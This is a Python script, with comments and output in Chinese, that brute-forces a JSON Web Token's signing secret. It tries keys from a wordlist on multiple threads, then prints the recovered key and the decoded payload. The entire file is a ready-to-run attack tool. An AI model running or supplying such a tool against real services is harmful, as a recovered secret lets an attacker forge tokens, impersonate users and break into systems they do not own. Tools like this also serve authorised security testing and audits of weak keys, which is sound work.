import jwt
import argparse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

def brute_force(token, wordlist_path, max_workers=8):
    """
    暴力破解 JWT 密钥
    """
    try:
        # 自动检测算法
        header = jwt.get_unverified_header(token)
        alg = header.get('alg', 'HS256')
        print(f"[*] 检测到算法: {alg}")
        
        # 读取字典
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            keys = [line.strip() for line in f if line.strip()]
        
        print(f"[*] 字典共 {len(keys)} 个密钥，使用 {max_workers} 个线程")
        
        found_key = None
        start = time.time()
        count = 0
        
        def try_key(key):
            try:
                jwt.decode(token, key, algorithms=[alg])
                return key, True
            except jwt.InvalidSignatureError:
                return key, False
            except Exception:
                return key, False
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(try_key, k): k for k in keys}
            
            for future in as_completed(futures):
                count += 1
                key, success = future.result()
                if success:
                    found_key = key
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                
                # 每1000次显示进度
                if count % 1000 == 0:
                    elapsed = time.time() - start
                    speed = count / elapsed if elapsed > 0 else 0
                    print(f"[*] 进度: {count}/{len(keys)} ({count/len(keys)*100:.1f}%) 速度: {speed:.1f} 次/秒")
        
        elapsed = time.time() - start
        if found_key:
            print(f"\n[+] 找到密钥: {found_key}")
            print(f"[+] 解密后 Payload: {jwt.decode(token, found_key, algorithms=[alg])}")
        else:
            print(f"\n[-] 未找到有效密钥，共尝试 {count} 个")
        print(f"[*] 耗时: {elapsed:.2f} 秒")
        
    except FileNotFoundError:
        print(f"[-] 字典文件不存在: {wordlist_path}")
    except Exception as e:
        print(f"[-] 错误: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="JWT 密钥暴力破解")
    parser.add_argument("token", help="JWT Token")
    parser.add_argument("-w", "--wordlist", default="wordlist.txt", help="字典路径")
    parser.add_argument("-t", "--threads", type=int, default=8, help="线程数")
    args = parser.parse_args()
    brute_force(args.token, args.wordlist, args.threads)